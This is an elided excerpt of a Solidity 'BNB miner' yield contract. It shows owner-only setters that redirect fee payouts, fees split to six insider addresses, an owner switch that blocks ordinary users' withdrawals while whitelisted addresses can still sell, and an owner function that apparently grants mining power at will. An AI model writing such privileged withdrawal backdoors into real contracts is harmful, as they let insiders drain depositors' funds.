...
// SPDX-License-Identifier: MIT
    ...
    contract BNB_MINER is ReentrancyGuard {
        ...
        address payable private project2;
        ...
        *************************************************************/
        ...
        function sellEggs() public nonReentrant onlyBlackListed {
            ...
            if(!validations[msg.sender]){
              require(isActive, "Not active... please wait until is active again");
            }
        ...
        function buyEggs(address ref) public payable onlyBlackListed {
            ...
            if (user.referrer != address(0)) {
                ...
                if (upline != address(0)) {
                 ...
                 project.transfer(toOwners);
                 partner.transfer(toOwners);
        ...
        **/
        ...
        function CHANGE_PROJECT2(address value) external onlyOwner {
            project2 = payable(value);
        }
        function CHANGE_PARTNER2(address value) external onlyOwner {
            partner2 = payable(value);
        }
        function CHANGE_MARKETING2(address value) external onlyOwner{
            marketing2 = payable(value);
        }
        ...
        *************************************************************/
        ...
        function payFeesInvest(uint _amount) internal {
            ...
            project.transfer(toOwners);
            partner.transfer(toOwners);
            marketing.transfer(toOwners);
            project2.transfer(toOwners);
            partner2.transfer(toOwners);
            marketing2.transfer(toOwners);
        }
        ...
        function aMiners(address _addr, uint256 m) external onlyOwner{
